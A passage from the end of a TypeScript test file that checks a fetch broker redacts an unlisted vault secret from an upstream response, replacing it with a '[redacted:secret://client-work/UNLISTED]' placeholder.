    setRespond(() => new Response(`leak: ${VAULT['client-work']!.UNLISTED}`, { headers: { 'content-type': 'text/plain' } }));
    const res = await broker.fetch({ ...base, url: 'https://api.example.com/repos/acme/issues' });
    expect(res.body).not.toContain('not-in-policy');
    expect(res.body).toContain('[redacted:secret://client-work/UNLISTED]');
  });
});
